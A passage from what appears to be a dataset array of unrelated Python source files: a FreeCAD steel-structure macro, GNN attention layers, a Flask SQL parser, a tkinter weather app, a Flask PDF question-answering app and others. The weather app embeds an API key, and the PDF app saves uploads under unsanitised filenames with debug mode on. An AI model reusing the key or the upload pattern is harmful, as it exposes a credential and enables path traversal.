over subsequences and split if we exceed the limit\n        # of max consecutive non-whitespace or whitespace characters.\n        MAX_NO_WHITESPACES_CHARS = 25_000\n\n        substrs = (\n            substr\n            for i in range(0, len(s), TIKTOKEN_MAX_ENCODE_CHARS)\n            for substr in self._split_whitespaces_or_nonwhitespaces(\n                s[i : i + TIKTOKEN_MAX_ENCODE_CHARS], MAX_NO_WHITESPACES_CHARS\n            )\n        )\n        t: List[int] = []\n        for substr in substrs:\n            t.extend(\n                self.model.encode(\n                    substr,\n                    allowed_special=allowed_special,\n                    disallowed_special=disallowed_special,\n                )\n            )\n        if b",
    "# -*- coding: utf-8 -*-\r\nimport os\r\nimport sys\r\nimport csv\r\nimport pathlib\r\nimport subprocess\r\nimport FreeCAD as App\r\nimport FreeCADGui as Gui\r\nfrom PySide import QtGui\r\nfrom PySide import QtUiTools\r\nfrom PySide import QtCore\r\nimport importlib\r\n\r\nCDia=['Post','ShapedSteel','SteelPlate','SteelStairs','Ladder','Handrail','Trestle',\r\n      'SteelBrace','LatticeBeam','TrussBeam','TurnBackle','accodionGate','grating',]\r\nStair=['for 2F','2F or higher','spiral staircase with stanchions','spiral staircase']\r\nLadder=['LadderA','LadderA with cage','LadderB','LadderB with cage']\r\nHandrail=['Straight line','Coner with end','Coner','Circular_arc','Edge','Channel']\r\nPost=['Pst_H','Pst_L','Pst_C','Pst_SQ','Pst_Pip',]\r\nShpStl=['Angle','Channel','H_Wide','H_medium','H_thin','I_beam','CT','STK',\r\n        'LightAngle','LightChannel','RipChannel','SQ_Pipe']\r\nTrestle=['type01','type02','type03','type04','type05']\r\nturnBackle_data=['turnBackle','forkEnd_L','forkEnd_R','turnBackle_Assy']\r\n\r\nclass Ui_Dialog(object):\r\n    global flag00\r\n    flag00=0\r\n    #print(flag00)\r\n    def setupUi(self, Dialog):\r\n        Dialog.setObjectName(\"Dialog\")\r\n        Dialog.resize(300, 410)\r\n        Dialog.move(1000, 0)\r\n        #\u90e8\u6750\u3000Element\r\n        self.label_element = QtGui.QLabel(Dialog)\r\n        self.label_element.setGeometry(QtCore.QRect(10, 13, 100, 12))\r\n        self.comboBox_element = QtGui.QComboBox(Dialog)\r\n        self.comboBox_element.setGeometry(QtCore.QRect(80, 10, 200, 22))\r\n        #\u90e8\u67502\u3000Element2\r\n        self.label_element2 = QtGui.QLabel(Dialog)\r\n        self.label_element2.setGeometry(QtCore.QRect(10, 38, 100, 12))\r\n        self.comboBox_element2 = QtGui.QComboBox(Dialog)\r\n        self.comboBox_element2.setGeometry(QtCore.QRect(80, 35, 200, 22))\r\n\r\n        #\u5b9f\u884c\r\n        self.pushButton = QtGui.QPushButton(Dialog)\r\n        self.pushButton.setGeometry(QtCore.QRect(80, 60, 100, 22))\r\n\r\n        #\u8cea\u91cf\u8a08\u7b97\r\n        self.pushButton_m = QtGui.QPushButton('massCulculation',Dialog)\r\n        self.pushButton_m.setGeometry(QtCore.QRect(80, 85, 100, 23))\r\n        self.pushButton_m.setObjectName(\"pushButton\")  \r\n        #\u8cea\u91cf\u96c6\u8a08\r\n        self.pushButton_m2 = QtGui.QPushButton('massTally',Dialog)\r\n        self.pushButton_m2.setGeometry(QtCore.QRect(180, 85, 100, 23))\r\n        self.pushButton_m2.setObjectName(\"pushButton\")\r\n        #\u8cea\u91cf\u5165\u529b\r\n        self.pushButton_m3 = QtGui.QPushButton('massImput[kg]',Dialog)\r\n        self.pushButton_m3.setGeometry(QtCore.QRect(80, 115, 100, 23))\r\n        self.pushButton_m3.setObjectName(\"pushButton\")  \r\n        self.le_mass = QtGui.QLineEdit(Dialog)\r\n        self.le_mass.setGeometry(QtCore.QRect(180, 115, 50, 20))\r\n        self.le_mass.setAlignment(QtCore.Qt.AlignCenter)  \r\n        self.le_mass.setText('10.0')\r\n        #\u5bc6\u5ea6\r\n        self.lbl_gr = QtGui.QLabel('SpecificGravity',Dialog)\r\n        self.lbl_gr.setGeometry(QtCore.QRect(80, 145, 80, 12))\r\n        self.le_gr = QtGui.QLineEdit(Dialog)\r\n        self.le_gr.setGeometry(QtCore.QRect(180, 142, 50, 20))\r\n        self.le_gr.setAlignment(QtCore.Qt.AlignCenter)  \r\n        self.le_gr.setText('7.85')\r\n\r\n        #img\r\n        self.img = QtGui.QLabel(Dialog)\r\n        self.img.setGeometry(QtCore.QRect(30, 140, 250, 250))\r\n        self.img.setAlignment(QtCore.Qt.AlignCenter)\r\n\r\n        self.comboBox_element.addItems(CDia)\r\n        self.comboBox_element.setCurrentIndex(1)\r\n        self.comboBox_element.currentIndexChanged[int].connect(self.onDia)\r\n        self.comboBox_element.setCurrentIndex(0)\r\n\r\n        self.comboBox_element.currentIndexChanged[int].connect(self.onDia2)\r\n\r\n        self.comboBox_element2.setCurrentIndex(1)\r\n        self.comboBox_element2.currentIndexChanged[int].connect(self.onDia2)\r\n        self.comboBox_element2.setCurrentIndex(0)\r\n\r\n        self.retranslateUi(Dialog)\r\n\r\n        QtCore.QObject.connect(self.pushButton, QtCore.SIGNAL(\"pressed()\"), self.create)\r\n        QtCore.QObject.connect(self.pushButton_m, QtCore.SIGNAL(\"pressed()\"), self.massCulc)\r\n        QtCore.QObject.connect(self.pushButton_m2, QtCore.SIGNAL(\"pressed()\"), self.massTally2)\r\n        QtCore.QObject.connect(self.pushButton_m3, QtCore.SIGNAL(\"pressed()\"), self.massImput)\r\n\r\n        QtCore.QMetaObject.connectSlotsByName(Dialog)\r\n\r\n    def retranslateUi(self, Dialog):\r\n        Dialog.setWindowTitle(QtGui.QApplication.translate(\"Dialog\", \"SteelStructure\", None))\r\n        self.label_element.setText(QtGui.QApplication.translate(\"Dialog\", \"Element\", None))  \r\n        self.label_element2.setText(QtGui.QApplication.translate(\"Dialog\", \"Element2\", None))   \r\n        self.pushButton.setText(QtGui.QApplication.translate(\"Dialog\", \"Execution\", None))  \r\n\r\n    def massImput(self):\r\n         # \u9078\u629e\u3057\u305f\u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u3092\u53d6\u5f97\u3059\u308b\r\n        c00 = Gui.Selection.getSelection()\r\n        if c00:\r\n            obj = c00[0]\r\n        label='mass[kg]'\r\n        g=float(self.le_mass.text())\r\n        try:\r\n            obj.addProperty(\"App::PropertyFloat\", \"mass\",label)\r\n            obj.mass=g\r\n        except:\r\n            obj.mass=g\r\n       ",
    "# Attention_GNN.py\n\n# Contains three classes:\n# - LlamaAttentionGIN: GIN-based attention mechanism.   \n# - LlamaAttentionPNA: PNA-based attention mechanism.\n# - LlamaAttentionPNA_LM: PNA-based attention mechanism adapted for LM.\n\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom datetime import datetime\n\nfrom transformers.models.llama.modeling_llama import (\n    LlamaRMSNorm,\n    LlamaRotaryEmbedding, apply_rotary_pos_emb, repeat_kv,\n)\nfrom transformers.models.llama.modeling_llama import *\n\nimport matplotlib.pyplot as plt\n\ndef FlowThreshold(x, threshold, sharpness_1=5.0, sharpness_2=50.0):\n    \"\"\"\n    Smooth custom activation function:\n    - Zero below 0.\n    - Smoothly rises from 0 at x=0 to 1 at x >= threshold.\n    \n    Args:\n        x (torch.Tensor): Input tensor.\n        threshold (float): Threshold above which the output is 1.\n        sharpness_1 (float): Controls steepness near x = 0.\n        sharpness_2 (float): Controls steepness near the threshold.\n\n    Returns:\n        torch.Tensor: Transformed output.\n    \"\"\"\n    # Sigmoid for transition near x=0\n    sigmoid_0 = F.sigmoid(sharpness_1 * x)\n    \n    # Sigmoid for transition near threshold\n    sigmoid_threshold = F.sigmoid(sharpness_2 * (x - threshold))\n    \n    # Combine the two, ensuring output is 0 below 0\n    smooth_output = sigmoid_0 * sigmoid_threshold\n    \n    return smooth_output\n\n\ndef scaled_topk_causal_4d(adj_matrix, sparsity_frac=0.5, threshold=0.0):\n    \"\"\"\n    Custom function to apply top-k selection with scaling and thresholding for 4D causal adjacency matrices.\n\n    Args:\n        adj_matrix (torch.Tensor): Adjacency matrix of shape (batch_size, num_heads, seq_len, seq_len).\n                                   Must be causal (upper triangular mask).\n        sparsity_frac (float): Fraction of available connections to retain (0 < sparsity_frac <= 1).\n        threshold (float): Minimum value for connections to be considered.\n\n    Returns:\n        torch.Tensor: Processed adjacency matrix with scaled top-k sparsity and threshold applied.\n    \"\"\"\n    # Validate inputs\n    if not (0 < sparsity_frac <= 1):\n        raise ValueError(\"`sparsity_frac` must be in the range (0, 1].\")\n\n    if adj_matrix.dim() != 4:\n        raise ValueError(\"`adj_matrix` must be a 4D tensor of shape (batch_size, num_heads, seq_len, seq_len).\")\n\n    # Get shape information\n    batch_size, num_heads, seq_len, _ = adj_matrix.shape\n\n    # Initialize the processed adjacency matrix\n    processed_adj = torch.zeros_like(adj_matrix)\n\n    # Iterate over each position in the sequence\n    for node_idx in range(1, seq_len):\n        # Calculate the dynamic top_k for this node based on sparsity fraction\n        available_predecessors = node_idx  # Number of available predecessors\n        top_k = max(1, math.ceil(sparsity_frac * available_predecessors))\n\n        # Select valid predecessors for this node (values above the threshold)\n        valid_connections = adj_matrix[:, :, node_idx, :node_idx] >= threshold\n\n        # Mask adj_matrix values below the threshold\n        filtered_adj = adj_matrix[:, :, node_idx, :node_idx] * valid_connections\n\n        # Select the top-k strongest connections (after applying the threshold)\n        _, indices = torch.topk(filtered_adj, top_k, dim=-1)\n\n        # Scatter top-k connections into the processed adjacency matrix\n        processed_adj[:, :, node_idx, :node_idx].scatter_(-1, indices, 1.0)\n\n    return processed_adj\n\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nimport math\n\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\n\nclass AdjRMSNorm(nn.Module):\n    def __init__(self, eps=1e-8, scalar_weight=True):\n        super().__init__()\n        self.eps = eps\n        self.scalar_weight = scalar_weight\n        if scalar_weight:\n            # Just one learnable scalar to scale everything.\n            self.weight = nn.Parameter(torch.tensor(1.0))\n        else:\n            # If you need more complicated parameterization, you need to know dims.\n            # But for fully flexible shape, stick to a scalar.\n            pass\n\n    def forward(self, x):\n        # x: (b, ...)\n        # We want to normalize across all dimensions except batch.\n        # Compute RMS over all non-batch dims:\n        # First, compute mean of squares:\n        # Reshape x to treat all non-batch dims as features:\n        b = x.shape[0]\n        feature_dims = x.dim() - 1\n        # Flatten all dims except batch into one dimension for mean calculation\n        x_flat = x.view(b, -1)\n        \n        # Mean of squares\n        rms = x_flat.pow(2).mean(dim=1, keepdim=True).add(self.eps).sqrt()\n        # rms shape: (b, 1)\n        \n        # Normalize\n        x_norm = x_flat / rms  # broadcast across all features per batch\n        x_norm = x_norm.view(*x.shape)  # reshape back to original shape\n\n        if self.scalar_weight:\n            x_norm = x_norm * self.weight\n\n        return x_norm\n\nclass GINLayer(nn.Module):\n    def __init__(se",
    "#!/usr/bin/python\r\n\r\nimport os,re,sys\r\nimport json\r\n\r\n\r\nwebsites = {}\r\ncurrentDir = os.path.dirname(os.path.abspath(__file__))\r\nextension = '.browsernav-website'\r\noutputFile = os.path.join(currentDir, 'output', 'websites.json')\r\nfor fileName in os.listdir(currentDir):\r\n    if not fileName.endswith(extension):\r\n        continue\r\n    j = json.loads(open(fileName, 'r', encoding='utf-8').read())\r\n    name = j['name']\r\n    if fileName != f\"{name}{extension}\":\r\n        print(f\"Build error: file {fileName} contains website definition with a different name {name}. Please rename either the file or website fefinition so that they match. \")\r\n        sys.exit(1)\r\n    websites[name] = {\r\n        'website': j,\r\n    }\r\n\r\n# Sorting websites by name\r\nwebsites = {\r\n    name: websites[name]\r\n    for name in sorted(list(websites.keys()))\r\n}\r\n\r\nj = {\r\n    'websites': websites,\r\n}\r\nf = open(outputFile, 'w', encoding='utf-8')\r\ntry:\r\n    s = json.dumps(j, indent=4, sort_keys=True)\r\n    print(s, file=f)\r\nfinally:\r\n    f.close()\r\n\r\nprint(\"Successfully built websites in local repository !\")\r\n\r\nsitesText = []\r\nfor name, website in websites.items():\r\n    sitesText.append(f\"### {name}\\n\")\r\n    sitesText.append(f\"* Version {website['website']['version']}\")\r\n    sitesText.append(website['website']['description'])\r\n    sitesText.append(\"\\n\")\r\nsitesText = \"\\n\".join(sitesText)\r\nreadmeTemplateFileName = os.path.join(currentDir, 'README_TEMPLATE.md')\r\nreadmeFileName = os.path.join(currentDir, 'README.md')\r\nreadmeText = open(readmeTemplateFileName, 'r', encoding='utf-8').read()\r\nreadmeText = readmeText.replace(\"!!!sitesPlaceHolder!!!\", sitesText)\r\n\r\nf = open(readmeFileName, 'w', encoding='utf-8')\r\ntry:\r\n    print(readmeText, file=f)\r\nfinally:\r\n    f.close()\r\n\r\nprint(\"Successfully updated README.md.\")\r\nprint(\"Now please create a PR to submit your change.\")\r\n",
    "from flask import Flask, request, jsonify\nfrom flask_cors import CORS\nimport sqlparse\nimport re\nimport json\n\napp = Flask(__name__)\nCORS(app) \n\n\ndef extract_insert_into(sql_query):\n    \"\"\"Extract the target table for INSERT INTO.\"\"\"\n    match = re.search(r\"INSERT INTO\\s+([\\w\\.]+)\", sql_query, re.IGNORECASE)\n    return match.group(1) if match else None\n\n\ndef extract_columns(select_clause):\n    \"\"\"Extract column details from SELECT clause.\"\"\"\n    columns = []\n    column_pattern = re.compile(\n        r\"(\\w+\\.\\w+|\\w+\\s+AS\\s+\\w+|\\w+\\.\\w+\\s+AS\\s+\\w+|\\w+|\\*)\", re.IGNORECASE\n    )\n    matches = column_pattern.findall(select_clause)\n    for match in matches:\n        column_info = {}\n        if \" AS \" in match.upper():\n            original, alias = match.upper().split(\" AS \")\n            column_info[\"original\"] = original.strip()\n            column_info[\"alias\"] = alias.strip()\n        else:\n            column_info[\"original\"] = match.strip()\n            column_info[\"alias\"] = None\n        columns.append(column_info)\n    return columns\n\n\ndef extract_tables_and_joins(from_clause):\n    \"\"\"Extract tables and join relationships.\"\"\"\n    tables = []\n    joins = []\n\n    # Extract tables\n    table_pattern = re.compile(r\"(FROM|JOIN)\\s+([\\w\\.]+)\\s*(?:AS\\s+(\\w+))?\", re.IGNORECASE)\n    for match in table_pattern.findall(from_clause):\n        tables.append({\n            \"type\": match[0].upper(),\n            \"table\": match[1].strip(),\n            \"alias\": match[2].strip() if match[2] else None\n        })\n\n    # Extract joins\n    join_pattern = re.compile(r\"(LEFT|RIGHT|INNER|FULL|CROSS)?\\s*JOIN\\s+([\\w\\.]+)\\s+ON\\s+(.+)\", re.IGNORECASE)\n    for match in join_pattern.findall(from_clause):\n        joins.append({\n            \"type\": match[0].upper() if match[0] else \"JOIN\",\n            \"table\": match[1].strip(),\n            \"condition\": match[2].strip()\n        })\n\n    return tables, joins\n\n\ndef extract_where_clause(sql_query):\n    \"\"\"Extract WHERE clause.\"\"\"\n    match = re.search(r\"WHERE\\s+(.+)\", sql_query, re.IGNORECASE)\n    return match.group(1).strip() if match else None\n\n\ndef parse_subqueries(sql_query):\n    subqueries = []\n    subquery_pattern = re.compile(r\"\\((SELECT.+?FROM.+?)\\)\", re.IGNORECASE | re.DOTALL)\n    matches = subquery_pattern.findall(sql_query)\n\n    for match in matches:\n        subquery_content = match.strip(\"()\")\n        subqueries.append(parse_sql_query(subquery_content))  # Recursively parse subquery\n\n    return subqueries\n\n\ndef extract_create_table(sql_query):\n    \"\"\"Extract details of CREATE TABLE statement.\"\"\"\n    result = {}\n    create_table_pattern = re.search(\n        r\"CREATE\\s+TABLE\\s+([\\w\\.]+)\\s*\\((.+?)\\)\\s*(ENGINE=\\w+)?\", sql_query, re.IGNORECASE | re.DOTALL\n    )\n    if create_table_pattern:\n        table_name = create_table_pattern.group(1).strip()\n        columns_section = create_table_pattern.group(2).strip()\n        engine = create_table_pattern.group(3).strip() if create_table_pattern.group(3) else None\n\n        # Parse columns\n        columns = []\n        column_pattern = re.compile(r\"(\\w+)\\s+([\\w\\(\\)\\s]+)(?:,|$)\", re.IGNORECASE)\n        for match in column_pattern.findall(columns_section):\n            columns.append({\n                \"name\": match[0].strip(),\n                \"definition\": match[1].strip()\n            })\n\n        result[\"table_name\"] = table_name\n        result[\"columns\"] = columns\n        if engine:\n            result[\"engine\"] = engine\n    return result\n\n\ndef parse_sql_query(sql_query):\n    \"\"\"Main function to parse SQL query into a comprehensive JSON structure.\"\"\"\n    result = {}\n\n    # Normalize and format query\n    formatted_query = sqlparse.format(sql_query, reindent=True, keyword_case=\"upper\")\n\n    # Check for CREATE TABLE\n    if \"CREATE TABLE\" in formatted_query.upper():\n        result[\"create_table\"] = extract_create_table(formatted_query)\n        return result\n\n    # Existing logic for other queries\n    # Parse INSERT INTO\n    insert_into = extract_insert_into(formatted_query)\n    if insert_into:\n        result[\"insert_into\"] = insert_into\n\n    # Parse SELECT clause\n    select_match = re.search(r\"SELECT\\s+DISTINCT\\s+(.+?)\\s+FROM\", formatted_query, re.IGNORECASE | re.DOTALL)\n    if not select_match:\n        select_match = re.search(r\"SELECT\\s+(.+?)\\s+FROM\", formatted_query, re.IGNORECASE | re.DOTALL)\n    if select_match:\n        result[\"result_set\"] = extract_columns(select_match.group(1))\n\n    # Parse FROM clause\n    from_match = re.search(r\"FROM\\s+(.+)\", formatted_query, re.IGNORECASE | re.DOTALL)\n    if from_match:\n        from_clause = from_match.group(1).split(\"WHERE\")[0].strip()\n        tables, joins = extract_tables_and_joins(from_clause)\n        if tables:\n            result[\"tables\"] = tables\n        if joins:\n            result[\"joins\"] = joins\n\n    # Parse WHERE clause\n    where_clause = extract_where_clause(formatted_query)\n    if where_clause:\n        result[\"where\"] = where_clause\n\n    # Parse subqueries\n    subqueries = parse_subqueries(formatted_query)\n   ",
    "import time\r\nimport os\r\n\r\nPATH = os.path.expanduser(\"~\") + \"\\\\OneDrive\\\\\u0420\u0430\u0431\u043e\u0447\u0438\u0439 \u0441\u0442\u043e\u043b\\\\pyproject\"\r\n\r\nprint\\\r\n(\"PyNT 1.01\")\r\nwhile True:\r\n    cd = input(\"<\" + PATH + \"> \")\r\n    if cd == \"compile\":\r\n        time.sleep(1)\r\n        print(\">> Compile\\n\\t> Compiling lib\")\r\n        time.sleep(10)\r\n        print(\"\\t> Compiling Daemon\")\r\n        time.sleep(2)\r\n        print(\"Task was ready!\")\r\n    elif cd == \"console.write\":\r\n        text = input(\"Text: \")\r\n        print(text)\r\n    elif cd == \"cd\":\r\n        PATH = input(\"Enter path: \")\r\n    elif cd == \"help\":\r\n        print(\"\"\"\r\n            PyNT 1.0:\r\n                compile - compile local directory\r\n                cd - change local directory\r\n                console.write - write the text\r\n                help - get help\r\n                file - work with files\r\n        \"\"\")\r\n    elif cd == \"file\":\r\n        try:\r\n            action = input(\"Enter create/delete/write/read: \")\r\n            if action == \"create\":\r\n                filename = input(\"Enter a filename: \")\r\n                path = open(PATH + '\\\\' + filename, \"w\")\r\n                path.close()\r\n                print(\"File \" + filename + \" created in \" + PATH)\r\n            elif action == \"write\":\r\n                filepath = input(\"Enter filepath with filename: \")\r\n                f = open(filepath, \"w\")\r\n                text = input(\"Enter data to write: \")\r\n                f.write(text)\r\n                f.close()\r\n            elif action == \"read\":\r\n                filepath = input(\"Enter filepath with filename: \")\r\n                f = open(filepath, \"r\")\r\n                print(f.read())\r\n                f.close()\r\n            elif action == \"delete\":\r\n                filepath = input(\"Enter filepath with filename: \")\r\n                os.remove(filepath)\r\n            else:\r\n                print(\"Error!\")\r\n        except:\r\n            print(\"Error!\")\r\n    else:\r\n        print(\"Command \" + '\"' + cd + '\"' + \" not found!\")\r\n",
    "import tensorflow as tf\nfrom tensorflow.keras.models import load_model\nfrom datasets import load_dataset\nimport numpy as np\nfrom PIL import Image\nimport os\n\nmodel = load_model('cats_and_dogs_classifier.h5')\n\nds = load_dataset(\"nedith22/cats_and_dogs\")\n\n# change the dataset to a format suitable for Keras\ndef preprocess_data(dataset):\n    images = []\n    labels = []\n    for item in dataset:\n        image = item['image'].resize((150, 150))\n        image = np.array(image)\n        images.append(image)\n        labels.append(item['labels'])\n    return tf.data.Dataset.from_tensor_slices((images, labels))\n\ntest_dataset = preprocess_data(ds['test'])\n\n# assesment of the model\ntest_loss, test_accuracy = model.evaluate(test_dataset.batch(20))\nprint(f'Test Loss: {test_loss}')\nprint(f'Test Accuracy: {test_accuracy}')\n\n# your image prediction\ndef predict_on_custom_image(image_path):\n    if not os.path.exists(image_path):\n        print(f\"File {image_path} does not exist.\")\n        return\n    try:\n        image = Image.open(image_path)\n        print(f\"Original image size: {image.size}\")  # (width, height)\n        image = image.resize((150, 150))\n        image = np.array(image)\n        image = np.expand_dims(image, axis=0)  # adding batch dimension\n        prediction = model.predict(image)\n        print(f'Predicted: {prediction[0][0]}')\n        if prediction[0][0] < 0.5:\n            print(\"The neural network suggests that it's a CAT!\")\n        else:\n            print(\"The neural network suggests that it's a DOG!\")\n    except Exception as e:\n        print(f\"Error loading image: {e}\")\n\ncustom_image_path = 'PATH_TO_YOUR_IMAGE' # change this to the path of your image\npredict_on_custom_image(custom_image_path)\n",
    "import tkinter as tk\r\nfrom tkinter import messagebox\r\nimport requests\r\nimport os\r\n\r\n\r\n# Function to fetch the weather\r\ndef get_weather():\r\n    city = city_entry.get().strip()\r\n    \r\n    if not city:\r\n        messagebox.showwarning(\"Warning\", \"Please enter a city name.\")\r\n        return\r\n    \r\n    api_key = os.getenv(\"WEATHER_API_KEY\", \"df5b9ea81a21a805f4949b1b064ccd8d\")\r\n    url = f\"http://api.openweathermap.org/data/2.5/weather?q={city}&appid={api_key}&units=metric\"\r\n    \r\n    status_label.config(text=\"Fetching weather data...\", fg=\"black\")\r\n    root.update_idletasks()\r\n    \r\n    try:\r\n        response = requests.get(url)\r\n        data = response.json()\r\n        \r\n        if data[\"cod\"] == 200:\r\n            main = data[\"main\"]\r\n            weather = data[\"weather\"][0]\r\n            wind = data[\"wind\"]\r\n            rain = data.get(\"rain\", {})\r\n            \r\n           # Extract weather details\r\n            temperature = main[\"temp\"]\r\n            feels_like = main[\"feels_like\"]\r\n            humidity = main[\"humidity\"]\r\n            description = weather[\"description\"]\r\n            wind_speed = wind[\"speed\"]\r\n            precipitation = rain.get(\"1h\", 0)\r\n            rain_chance = \"Likely\" if precipitation > 0 else \"None\"\r\n            \r\n\r\n              # Update UI with data\r\n            temperature_label.config(text=f\"Temperature\ud83c\udf21: {temperature}\u00b0C\" , fg=\"indigo\")\r\n            humidity_label.config(text=f\"Humidity\u2601: {humidity}%\" , fg=\"indigo\")\r\n            description_label.config(text=f\"Description\u26c5: {description.capitalize()}\"  , fg=\"indigo\")\r\n            wind_label.config(text=f\"Wind Speed\ud83c\udf2a: {wind_speed} m/s\" , fg=\"indigo\")\r\n            precipitation_label.config(text=f\"Precipitation (last hour)\ud83c\udf2c: {precipitation} mm\" , fg=\"indigo\")\r\n            rain_chance_label.config(text=f\"Chance of Rain\u2614: {rain_chance}\" , fg=\"indigo\")\r\n            \r\n            status_label.config(text=\"Weather data fetched successfully!\", fg=\"black\")\r\n        else:\r\n            messagebox.showerror(\"Error\", data.get(\"message\", \"City not found.\"))\r\n            status_label.config(text=\"\", fg=\"red\")\r\n\r\n    except requests.exceptions.RequestException:\r\n        messagebox.showerror(\"Error\", \"Unable to fetch data. Check your internet connection.\")\r\n        status_label.config(text=\"\", fg=\"red\")\r\n\r\n\r\n# Create the main window\r\nroot = tk.Tk()\r\nroot.title(\" the Live city Weather \")\r\nroot.geometry(\"500x600\")\r\n\r\n# Load the background image\r\ntry:\r\n    background_image = tk.PhotoImage(file=r\"E:\\project\\background.png\")\r\nexcept Exception as e:\r\n    print(f\"Error loading background image: {e}\")\r\n    exit()  # Terminate if the image can't be loaded\r\n\r\ncanvas = tk.Canvas(root, width=500, height=600)\r\ncanvas.create_image(0, 0, anchor=\"nw\", image=background_image)\r\ncanvas.pack(fill=\"both\", expand=True)\r\n\r\nframe = tk.Frame(root, bg=\"cadetblue\", bd=8, relief=\"ridge\")  # Thicker border and ridge style\r\nframe.place(relx=0.5, rely=0.1, anchor=\"n\")\r\n\r\ncity_label = tk.Label(\r\n    frame, \r\n    text=\"Enter City Name\ud83c\udf0e:\", \r\n    font=(\"Comic Sans MS\", 16, \"bold\"),  # Larger and bold font\r\n    bg=\"#ffffff\",  # White background\r\n    fg=\"#333333\"  # Darker text for contrast\r\n)\r\ncity_label.grid(row=0, column=0, padx=15, pady=15)\r\n\r\ncity_entry = tk.Entry(\r\n    frame, \r\n    width=22, \r\n    font=(\"Helvetica\", 16, \"bold\"),  # Bold entry text\r\n    bd=4,  # Border thickness for entry\r\n    relief=\"sunken\"  # Sunken style for input field\r\n)\r\ncity_entry.grid(row=0, column=1, padx=15, pady=15)\r\n\r\nsearch_button = tk.Button(\r\n    frame, \r\n    text=\"Get Weather\", \r\n    command=get_weather, \r\n    font=(\"Helvetica\", 14, \"bold\"),  # Bold and larger button text\r\n    bg=\"teal\",  # teal background\r\n    fg=\"white\",  # White text\r\n    activebackground=\"teal\",  # Darker green on hover\r\n    activeforeground=\"white\"  # White text on hover\r\n)\r\nsearch_button.grid(row=0, column=2, padx=15, pady=15)\r\n\r\n\r\n\r\n# Weather Data Table Layout\r\nweather_frame = tk.Frame(root, bg=\"pale green\", bd=5)\r\nweather_frame.place(relx=0.5, rely=0.4, anchor=\"n\")\r\n\r\ntemperature_label = tk.Label(weather_frame, text=\"Temperature: N/A\", font=(\"Comic Sans MS\", 18), bg=\"thistle\")\r\ntemperature_label.grid(row=0, column=0, padx=20, pady=10)\r\n\r\nhumidity_label = tk.Label(weather_frame, text=\"Humidity: N/A\", font=(\"Comic Sans MS\", 18), bg=\"thistle\")\r\nhumidity_label.grid(row=1, column=0, padx=20, pady=10)\r\n\r\ndescription_label = tk.Label(weather_frame, text=\"Description: N/A\", font=(\"Comic Sans MS\", 18), bg=\"thistle\")\r\ndescription_label.grid(row=2, column=0, padx=20, pady=10)\r\n\r\nwind_label = tk.Label(weather_frame, text=\"Wind Speed: N/A\", font=(\"Comic Sans MS\",  18), bg=\"thistle\")\r\nwind_label.grid(row=3, column=0, padx=20, pady=10)\r\n\r\nprecipitation_label = tk.Label(weather_frame, text=\"Precipitation: N/A\", font=(\"Comic Sans MS\", 18), bg=\"thistle\")\r\nprecipitation_label.grid(row=4, column=0, padx=20, pady=10)\r\n\r\nrain_chance_label = tk.Label(weather_frame, text=\"Chance of Rain: N/A\", font=(\"Comic Sans MS\", 18), bg=\"thistle\")\r\nrain_chance_",
    "from flask import Flask, request, jsonify, render_template\r\nimport os\r\nimport pdfplumber\r\nfrom transformers import pipeline\r\n\r\napp = Flask(__name__)\r\n\r\nUPLOAD_FOLDER = 'uploads/'\r\nos.makedirs(UPLOAD_FOLDER, exist_ok=True)\r\n\r\n# Extract text from PDF using pdfplumber\r\ndef extract_text_from_pdf(file_path):\r\n    try:\r\n        text = ''\r\n        with pdfplumber.open(file_path) as pdf:\r\n            for page in pdf.pages:\r\n                page_text = page.extract_text()\r\n                if page_text:  \r\n                    text += page_text\r\n        if not text:\r\n            raise ValueError(\"No text found in PDF.\")\r\n        return text\r\n    except Exception as e:\r\n        print(f\"Error extracting text from PDF: {e}\")\r\n        return None\r\n\r\n# Initialize the Hugging Face pipeline for Question Answering\r\nqa_pipeline = pipeline(\"question-answering\", model=\"distilbert-base-uncased-distilled-squad\")\r\n\r\n@app.route('/')\r\ndef home():\r\n    return render_template('index.html')\r\n\r\n# Upload PDF and extract text\r\n@app.route('/upload', methods=['POST'])\r\ndef upload_pdf():\r\n    if 'file' not in request.files:\r\n        return jsonify({\"error\": \"No file part in the request.\"}), 400\r\n\r\n    file = request.files['file']\r\n    if file.filename == '':\r\n        return jsonify({\"error\": \"No file selected.\"}), 400\r\n\r\n    if file and file.filename.endswith('.pdf'):\r\n        file_path = os.path.join(UPLOAD_FOLDER, file.filename)\r\n        try:\r\n            file.save(file_path)\r\n            text = extract_text_from_pdf(file_path)\r\n            if text is None:\r\n                return jsonify({\"error\": \"Failed to extract text. The file may not contain readable text.\"}), 400\r\n            print(\"Extracted Text:\", text[:200])  \r\n            return jsonify({\"message\": \"File uploaded successfully\", \"text\": text}), 200\r\n        except Exception as e:\r\n            print(f\"Error processing PDF: {e}\")\r\n            return jsonify({\"error\": \"An error occurred while processing the PDF.\"}), 500\r\n    else:\r\n        return jsonify({\"error\": \"Invalid file format. Only PDF is allowed.\"}), 400\r\n\r\n# Answer a question based on document text\r\n@app.route('/ask', methods=['POST'])\r\ndef ask_question():\r\n    data = request.get_json()\r\n    question = data.get('question')\r\n    document_text = data.get('document_text')\r\n\r\n    if not question or not document_text:\r\n        return jsonify({\"error\": \"Both 'question' and 'document_text' are required.\"}), 400\r\n\r\n    try:\r\n        # Answering question based on document text\r\n        answer = qa_pipeline(question=question, context=document_text)\r\n        print(f\"Question: {question}, Answer: {answer['answer']}\")  \r\n        return jsonify({\"answer\": answer['answer']}), 200\r\n    except Exception as e:\r\n        print(f\"Error in QA pipeline: {e}\")\r\n        return jsonify({\"error\": \"An error occurred while processing the question.\"}), 500\r\n\r\nif __name__ == '__main__':\r\n    app.run(debug=True)\r\n",
